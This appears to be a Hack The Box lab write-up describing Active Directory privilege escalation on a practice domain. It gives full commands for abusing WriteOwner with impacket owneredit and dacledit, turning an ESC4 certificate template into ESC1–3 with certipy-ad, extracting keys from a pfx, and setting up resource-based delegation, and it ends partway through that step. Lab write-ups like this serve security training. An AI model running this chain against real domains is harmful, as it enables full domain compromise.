# Machine Information

Cicada was an easy-rated assume-breached scenario Active Directory machine on Hack-The-Box. It involved dumping the user **accounts.xlsx** file from SMB shares. The **SA** account from the accounts.xlsx file led us to access MS-SQL as an admin user. By enabling xp_cmdshell, I enumerated the internal directories and found the SQL2019 directory with the file named sql-Configuration.INI, which contained the **sql_svc** user credentials. These credentials also worked for the domain user ryan. For privilege escalation, our user ryan has WriteOwner permission on the **CA_SVC** user, and CA_SVC is a member of the **cert publisher** group. This can be exploited using **ESC4** certificate abuse to gain domain administrator access on the sequel.htb domain.

After running Nmap, we'll have a list of open ports on the network, and we'll use tools like **cut** and **tr** to filter out only the open ones.

# Privilege Escalation


From bloodhound find shortest path to domain admins, i found that the user **CA_SVC** is a member of **Cert Publisher** group and the all the members of group **Cert Publisher** can perform **ADCSEC4** attack to gain administrator access on Domain controller an then perform **DCsync attack** to dump **ntds.dit** file from there.

<img alt="abc" src=https://i.imgur.com/zrIA7T5.png>

So lets mark **CA_SVC** as a high value target and check it's inbound access controls. from Inbound access controls of **CA_SVC** user i identified that our current user **ryan** has **WriteOwner** permission on **CA_SVC** user. 

So according to [**Hacker Recipies**](https://www.thehacker.recipes/assets/DACL%20abuse%20mindmap.CnS4bNaY.png), if we have a **WriteOwner** permission on a group or object, we can modify it's permissions and grant our self with high permission like **GenericAll**, using which we can perform anything on that object. in Our case we will be granting **GenericAll** rights to **ryan** on **CA_SVC** user, so that we can forcibly change it's password using **ForceChangePassword** permission and log into his account without knowing his password.

### Abusing WriteOwner to grant GenericAll


#### Changing Owner of ryan using owneredit

First we will use **owneredit** from impacket to become the owner of the ca_svc user because we have **WriteOwner** permission on it.

```bash
impacket-owneredit -action write -new-owner 'ryan' -target 'ca_svc' 'sequel.htb'/'ryan':'WqSZAF6CysDQbGb3'
```

- **`-action write`** → Specifies that we want to change the owner.
- **`-new-owner 'ryan'`** → Sets the new owner of the target object (`ca_svc`) to the user `ryan`.
- **`-target 'ca_svc'`** → The AD object whose ownership is being modified.
- **`'sequel.htb'/'ryan':'WqSZAF6CysDQbGb3'`** →
    - **`sequel.htb`** → The AD domain.
    - **`ryan`** → Username used for authentication.
    - **`WqSZAF6CysDQbGb3`** → Ryan's password for authentication.

<img alt="abc" src=https://i.imgur.com/FLAai7P.png>

#### Chaning ACL's of ca_svc using dacledit

After controlling the **ca_svc** user let's get full control on it using **dacledit** from impacket by editing it's access controls. 

```bash
impacket-dacledit -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' "sequel.htb"/"ryan":"WqSZAF6CysDQbGb3"
```

<img alt="abc" src=https://i.imgur.com/ffDKfcS.png>

### Finding Vulnerable Certificate using certipy-ad and Exploiting ESC4 

Because this is a certificate service account, we can use it to enumerate the Vulnerable Certificate on the Domain

Now we can abuse ADCSEC04 to obtain Admin access on domain.

```bash
certipy-ad find -u ca_svc -p 'Password@123' -dc-ip 10.10.11.51 -stdout -vulnerable
```


<img alt="abc" src=https://i.imgur.com/4LdI8d7.png>

because our user **ca_svc** is a member of **Cert Publisher** group, he can do anything with **DunderMiddlinAuthentication** template because the group **Cert Publisher** has **Full Control** on **DunderMifflinauthentication** template. 

TO abuse ESC4, we need three things that our user or group of which our user is a member, can perform.

1. Write Owner Principal
2. Write Dacl Principal
3. Write Property Principals

In this case our user **ca_svc** is a member of **Cert Publisher** group and the **Cert Publisher** group has all these rights on **DunderMifflinauthentication** Template and all the other high value groups also have the same permission on it. 

<img alt="abc" src=https://i.imgur.com/2NS3Ylz.png>

Now we can make this template vulnerable to ESC1. ESC2, ESC3 and then abuse it to become domain administrator group member.


```bash
certipy-ad template -template 'DunderMifflinauthentication' -save-old -u 'ca_svc' -p 'Password@123' -dc-ip 10.10.11.51
```

<img alt="abc" src=https://i.imgur.com/kNtvzJ6.png>


Now if we run below command again, we can see that the templates become vulnerable to ESC1, ESC2, ESC3.

```bash
certipy-ad find -u ca_svc -p 'Password@123' -dc-ip 10.10.11.51 -stdout -vulnerable
```

<img alt="abc" src=https://i.imgur.com/AwoGI4e.png>

We an see that now all the authenticated user can abuse to gain access to domain controller.

#### Manual using openssl

This thing we done in Authority machine from hackthebox.
The **.pfx** file, which is in a **PKCS#12** format, contains the SSL certificate (public keys) and the corresponding private keys. Sometimes, you might have to import the certificate and private keys separately in an unencrypted plain text format to use it on another system. 

So let's begin by dumping the private key from `administrator_sequel.pfx` file using **openssl**.

```bash
 openssl pkcs12 -in administrator_sequel.pfx -nocerts -out  admin.key
```

<img alt="abc" src=https://i.imgur.com/ZJTYxXR.png>

Now dump certificate from it using command.

```bash
openssl pkcs12 -in administrator_sequel.pfx  -nokeys -out admin.crt
```

<img alt="abc" src=https://i.imgur.com/NHTsJwo.png>

Because now we have both Admin certificate and the Admin key, we can give our controlled user or computer some special permissions like **Resource Based Constrained Delegation**. 

Resource-Based Constrained Delegation allows for delegation settings to be configured on the target service/resource instead of on the user account (interactive account). Resource-Based Constrained Delegation is implemented by “**msDS-AllowedToActOnBehalfOfOtherIdentity**” on a target computer object.

```bash
passthecert.py -dc-ip 10.10.11.51 -crt admin.crt -key admin.key -domain sequel.htb -port 636 -action write_rbcd -delegate-to 'administrator' -delegate-from 'ca_svc'
```
